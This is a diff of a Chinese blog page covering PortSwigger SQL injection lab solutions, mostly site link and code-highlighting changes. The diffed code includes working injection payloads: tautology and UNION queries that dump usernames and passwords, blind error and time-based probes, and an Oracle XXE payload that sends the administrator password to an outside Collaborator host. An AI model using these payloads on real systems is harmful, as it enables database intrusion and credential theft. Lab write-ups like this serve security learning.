@@ -24,7 +24,7 @@
     <meta name="description" content="All labs | Web Security Academy (portswigger.net)  WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据   目的为查看隐藏的数据，所有产品   URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击   URL 中输入&#39;+OR+1&#x3D;1-- （查询字符串中空格被编码成+号）   数据库执行的 SQL 查询">
 <meta property="og:type" content="article">
 <meta property="og:title" content="portswigger 靶场之 SQL 注入">
-<meta property="og:url" content="https://zero-yi7.github.io/2022/06/15/sql-injection/index.html">
+<meta property="og:url" content="https://askrabbit.cn/2022/06/15/sql-injection/">
 <meta property="og:site_name" content="Rabbit&#39;s Blog">
 <meta property="og:description" content="All labs | Web Security Academy (portswigger.net)  WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据   目的为查看隐藏的数据，所有产品   URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击   URL 中输入&#39;+OR+1&#x3D;1-- （查询字符串中空格被编码成+号）   数据库执行的 SQL 查询">
 <meta property="og:locale" content="zh_CN">
@@ -60,7 +60,7 @@
   
   
   
-  
+  <meta name="keywords" content="编程, Web开发, 前端, 后端, JavaScript, Python, 个人成长, 生活, 思考, Rabbit, 安全, 读书, 微信读书, 女权">
 
   <!-- feed -->
   
@@ -90,21 +90,21 @@
 <div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/index.html"><div class="main" ff="title">portswigger</div></a></div></header>
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/"><div class="main" ff="title">portswigger</div></a></div></header>
 
 <div class="nav-area">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/portswigger/" placeholder="在portswigger靶场中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
-<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item" title="探索" href="/wiki/"><span>探索</span></a></nav>
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
 </div>
 <div class="widgets">
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/index.html#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection.html"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1.html"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2.html"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf.html"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack.html"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf.html"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling.html"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal.html"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link" href="/wiki/portswigger/clickjacking.html"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span></a><a class="link" href="/wiki/portswigger/authentication.html"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control.html"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload.html"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws.html"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection.html"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link" href="/wiki/portswigger/clickjacking"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span></a><a class="link" href="/wiki/portswigger/authentication"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
 
 
 </div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a></div></footer>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
 </div></aside><div class="l_main" id="main">
 
 
@@ -114,7 +114,7 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/index.html">portswigger</a></div>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/">portswigger</a></div>
 <div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2022-06-15T15:16:53.000Z">2022-06-15</time></span></div></div></div>
     
     <div class="bottom only-title">
@@ -142,9 +142,7 @@
 <ul>
 <li>
 <p>数据库执行的 SQL 查询则为</p>
-<pre><code class="language-sql">SELECT * FROM products 
-WHERE category = ''or 1=1-- ' AND released = 1
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <br><span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; AND released = 1</span><br></code></pre></td></tr></table></figure>
 </li>
 <li>
 <p>通过<code>'</code>来闭合参数，<code>-- </code>来注释后半部分</p>
@@ -233,9 +231,7 @@ WHERE category = ''or 1=1-- ' AND released = 1
 <ul>
 <li>
 <p>后台 SQL 查询为</p>
-<pre><code class="language-sql">select &amp; from products 
-where category = 'Gifts' union select username,password from users-- ' AND released = 1
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&amp;</span> <span class="hljs-keyword">from</span> products <br><span class="hljs-keyword">where</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- &#x27; AND released = 1</span><br></code></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
@@ -290,11 +286,7 @@ where category = 'Gifts' union select username,password from users-- ' AND relea
 <ul>
 <li><code>' order by 3-- '</code>500，实践证明列数为 2</li>
 </ul>
-<pre><code class="language-sql">-- Oracle 查询数据库版本
-Oracle	SELECT banner FROM v$version
-
-SELECT version FROM v$instance
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- Oracle 查询数据库版本</span><br>Oracle    <span class="hljs-keyword">SELECT</span> banner <span class="hljs-keyword">FROM</span> v$version<br><br><span class="hljs-keyword">SELECT</span> version <span class="hljs-keyword">FROM</span> v$instance<br></code></pre></td></tr></table></figure>
 </li>
 <li>
 <p>在 URL 或者 bp 软件中输入<code>' union select null,banner from v$version-- '</code></p>
@@ -603,23 +595,12 @@ SELECT version FROM v$instance
 <ul>
 <li>
 <p><code>'||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||'</code> --&gt; 500，验证条件（when (1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段<code>administrator</code></p>
-<pre><code class="language-sql">case
-when (1=1) then to_char(1/0)
-else ''
-end
--- 1/0 会导致错误
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">-- 1/0 会导致错误</span><br></code></pre></td></tr></table></figure>
 </li>
 <li>
 <blockquote>
 <p>CASE表达式可以在 SQL 中实现if-then-else型的逻辑</p>
-<pre><code class="language-sql">case
-when 判断语句1 then 返回1
-when 判断语句2 then 返回2
-……
-else 返回n
-end
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> 判断语句<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> 返回<span class="hljs-number">1</span><br><span class="hljs-keyword">when</span> 判断语句<span class="hljs-number">2</span> <span class="hljs-keyword">then</span> 返回<span class="hljs-number">2</span><br>……<br><span class="hljs-keyword">else</span> 返回n<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
 </blockquote>
 </li>
 </ul>
@@ -642,11 +623,7 @@ end
 </li>
 <li>
 <p><code>'||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||'</code></p>
-<pre><code class="language-sql">case
-when substr(password,1,1)='a' then to_char(1/0)
-else ''
-end
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
 </li>
 <li>
 <p>输出 http 状态码为 500 的时候，说明找到了密码</p>
@@ -669,9 +646,7 @@ end
 </li>
 <li>
 <p><code>'||(select pg_sleep(10))-- '</code> --&gt; 发现需要 10s 的响应时间</p>
-<pre><code class="language-sql">select tracking-id from tracking-table
-where trackingid='pvhzsNX3X3hoWEpS'||(select pg_sleep(10))-- ';
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> tracking<span class="hljs-operator">-</span>id <span class="hljs-keyword">from</span> tracking<span class="hljs-operator">-</span><span class="hljs-keyword">table</span><br><span class="hljs-keyword">where</span> trackingid<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pvhzsNX3X3hoWEpS&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">select</span> pg_sleep(<span class="hljs-number">10</span>))<span class="hljs-comment">-- &#x27;;</span><br></code></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
@@ -725,10 +700,8 @@ where trackingid='pvhzsNX3X3hoWEpS'||(select pg_sleep(10))-- ';
 </ul>
 </li>
 </ul>
-<pre><code class="language-sql">' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual--
-</code></pre>
-<pre><code class="language-sql">EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;'),'/l')
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="hljs-operator">&lt;</span>?xml version<span class="hljs-operator">=</span>&quot;1.0&quot; encoding<span class="hljs-operator">=</span>&quot;UTF-8&quot;?<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE root [ <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>ENTITY <span class="hljs-operator">%</span> remote <span class="hljs-keyword">SYSTEM</span> &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;<span class="hljs-operator">&gt;</span> <span class="hljs-operator">%</span>remote;]<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-operator">/</span>l<span class="hljs-string">&#x27;) FROM dual--</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">EXTRACTVALUE(xmltype(<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;</span>),<span class="hljs-string">&#x27;/l&#x27;</span>)<br></code></pre></td></tr></table></figure>
 <blockquote>
 <p>EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。</p>
 </blockquote>
@@ -737,8 +710,7 @@ where trackingid='pvhzsNX3X3hoWEpS'||(select pg_sleep(10))-- ';
 <ul>
 <li>依旧是上个题目的套路</li>
 </ul>
-<pre><code class="language-sql">' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT password FROM users WHERE username='administrator')||'.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;&gt; %remote;]&gt;'),'/l') FROM dual--
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;</span><span class="hljs-operator">&lt;</span>?xml version<span class="hljs-operator">=</span>&quot;1.0&quot; encoding<span class="hljs-operator">=</span>&quot;UTF-8&quot;?<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>DOCTYPE root [ <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span>ENTITY <span class="hljs-operator">%</span> remote <span class="hljs-keyword">SYSTEM</span> &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;<span class="hljs-operator">&gt;</span> <span class="hljs-operator">%</span>remote;]<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;),&#x27;</span><span class="hljs-operator">/</span>l<span class="hljs-string">&#x27;) FROM dual--</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20SQL%20%E6%B3%A8%E5%85%A5/202410061754922.png" alt="image-20221227155023363"></p>
 <h3 id="通过-XML-3编码绕过过滤器的-SQL-注入"><strong>通过 XML 3编码绕过过滤器的 SQL 注入</strong></h3>
 <ul>
